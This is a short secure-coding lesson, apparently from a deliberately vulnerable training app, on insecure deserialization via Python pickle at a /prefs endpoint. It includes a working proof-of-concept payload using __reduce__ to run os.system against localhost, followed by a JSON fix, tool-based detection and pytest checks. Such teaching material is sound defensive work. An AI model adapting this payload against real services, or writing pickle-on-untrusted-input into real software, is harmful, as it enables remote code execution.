# 07 — Insecure Deserialization

**OWASP A08:2021 — Software and Data Integrity Failures.**

## Where

`POST /prefs` deserializes the request body with `pickle`.

## Exploit

`pickle.loads` executes an object's `__reduce__` during deserialization, so an
attacker-crafted blob runs code:

```python
import base64, os, pickle, requests

class Exploit:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

payload = base64.b64encode(pickle.dumps(Exploit()))
requests.post("http://127.0.0.1:5000/prefs", data=payload)
# /tmp/pwned now exists -> remote code execution
```

## Source → Sink → Impact → Control

- **Source:** the request body.
- **Sink:** `pickle.loads`.
- **Impact:** remote code execution — the worst outcome.
- **Control:** never deserialize untrusted data with `pickle`, `yaml.load`,
  Java serialization, or similar. Use a data-only format such as JSON.

## The fix

```python
import json
data = json.loads(blob.decode() or "{}")
```

JSON carries data, not code, so a malicious payload cannot execute. If you must
use a rich format, sign the data and verify the signature before parsing, and
restrict allowed types.

## Detect with free tools

Semgrep and Bandit flag `pickle.loads`, `yaml.load` (without `SafeLoader`), and
similar sinks on untrusted input.

## Verify

```bash
pytest tests/test_exploits.py::test_insecure_deserialization_executes_code -v
pytest tests/test_fixes.py::test_deserialization_safe -v
```
